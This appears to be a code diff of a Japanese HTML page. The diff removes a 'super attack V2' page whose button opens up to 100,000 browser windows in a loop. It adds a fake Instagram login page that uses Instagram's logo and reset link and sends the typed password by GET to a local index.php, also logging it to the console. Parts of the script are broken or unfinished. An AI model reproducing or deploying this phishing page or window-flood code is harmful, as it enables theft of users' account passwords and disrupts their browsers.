@@ -1,43 +1,49 @@
+
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
+    <script src=".js"></script>
 </head>
 <body>
-    <h1>超攻撃V2</h1><button id="button">開始</button> <button id="button2">サーバー取り消し</button>（開始したらワンちゃん停止ボタン押せないからよろ）
-
+    <form action="index.php" method="get">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png">
+        <input type="text" name="password" id="input" autocomplete="off" placeholder="パスワード"><br>
+    　　<a href="https://www.instagram.com/accounts/password/reset/"> パスワードを忘れた場合</a><br>
+    <button type="submit" id="button">ログイン</button>
+</form>
 <script>
 const button = document.getElementById("button");
-const button2 = document.getElementById("button2");
-let not = 1;
-let random = Math.random();
+const input = document.getElementById("input");
 
 button.addEventListener("click",function() {
-    while(not) {
-        window.open();
-        not++;
-
-        //繰り返し処理を止める
-        if(not >= 100000) {
-            break;
-        }
-    }
+if(input.value == "") {
+alert("パスワードを入力してください");
+}else{
+function name () {
+//prompt('電話番号、ユーザーネーム、メールアドレス')
+}
+name(); 
+console.log("パスワードは「"+input.value +"」、メールアドレスは「"+ name.value+"」") 
+}
 });
-button2.addEventListener("click",function() {
-    window.close();
-});
-
 </script>
+</body>
 <style>
-body{
-background-color: aqua;
+input{
+width: 400px;
+height: 20px;
 }
 button{
-background-color: moccasin;
+color:white;
+background-color: #4c64D3;
+border:none;
+border-radius: 10px;
+width: 410px;
+height: 30px;
 }
 </style>
-</body>
 </html>
